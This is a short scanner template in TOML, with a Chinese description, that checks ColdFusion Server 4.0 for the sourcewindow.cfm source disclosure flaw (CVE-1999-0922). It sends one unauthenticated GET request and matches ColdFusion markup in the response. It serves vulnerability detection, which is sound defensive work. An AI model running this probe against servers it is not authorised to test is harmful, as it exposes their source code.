[info]
author = "AVE"
description = "检测 ColdFusion Server 4.0 sourcewindow.cfm 源代码泄露漏洞。远程攻击者无需认证即可通过直接访问该文件获取服务器上任意源代码文件内容。"
id = "POC-AVE-1999-0722"
name = "CVE-1999-0922 PoC"
severity = "medium"
tags = [
    "cve-1999-0922",
    "coldfusion",
    "source-disclosure",
]
vuln_id = [
    "CVE-1999-0922",
    "AVE-1999-0722",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/sourcewindow.cfm"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "<cf",
    "ColdFusion",
    "cfscript",
    "cfoutput",
    "cfquery",
]
